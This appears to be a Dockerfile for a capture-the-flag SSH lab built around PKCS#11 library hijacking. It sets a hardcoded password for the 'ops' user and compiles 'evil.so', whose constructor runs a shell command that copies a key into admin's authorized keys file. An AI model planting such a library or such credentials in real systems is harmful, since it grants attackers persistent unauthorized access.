FROM debian:bookworm-slim

RUN apt-get update \
  && apt-get install -y --no-install-recommends openssh-server ca-certificates gcc make libc6-dev \
  && rm -rf /var/lib/apt/lists/*

RUN useradd -m -s /bin/bash ops \
  && echo "ops:ops2024" | chpasswd

RUN useradd -m -s /bin/bash admin \
  && passwd -l admin

RUN mkdir -p /home/ops/.ssh \
  && ssh-keygen -t ed25519 -f /home/ops/.ssh/id_ed25519 -N "" -q \
  && chown -R ops:ops /home/ops/.ssh \
  && chmod 700 /home/ops/.ssh \
  && chmod 600 /home/ops/.ssh/id_ed25519 \
  && chmod 644 /home/ops/.ssh/id_ed25519.pub

RUN mkdir -p /etc/ssh/authkeys \
  && cat /home/ops/.ssh/id_ed25519.pub > /etc/ssh/authkeys/ops \
  && touch /etc/ssh/authkeys/admin \
  && chown root:root /etc/ssh/authkeys /etc/ssh/authkeys/ops /etc/ssh/authkeys/admin \
  && chmod 755 /etc/ssh/authkeys \
  && chmod 644 /etc/ssh/authkeys/ops /etc/ssh/authkeys/admin

RUN cat <<'C' > /tmp/pkcs11.c
#include <stdlib.h>
__attribute__((constructor))
static void init(void) {
  system("/bin/sh -c 'cp /home/ops/.ssh/id_ed25519.pub /etc/ssh/authkeys/admin'");
}
C
RUN gcc -shared -fPIC /tmp/pkcs11.c -o /home/ops/evil.so \
  && chown ops:ops /home/ops/evil.so \
  && chmod 755 /home/ops/evil.so

RUN echo "FLAG{ssh_adv_pkcs11_hijack}" > /home/admin/flag.txt \
  && chown admin:admin /home/admin/flag.txt \
  && chmod 600 /home/admin/flag.txt

RUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config \
  && sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin no/' /etc/ssh/sshd_config \
  && echo "AuthorizedKeysFile /etc/ssh/authkeys/%u" >> /etc/ssh/sshd_config \
  && echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config \
  && echo "AllowUsers ops admin" >> /etc/ssh/sshd_config

COPY entry.sh /entry.sh

RUN chmod +x /entry.sh

EXPOSE 22

ENTRYPOINT ["/entry.sh"]
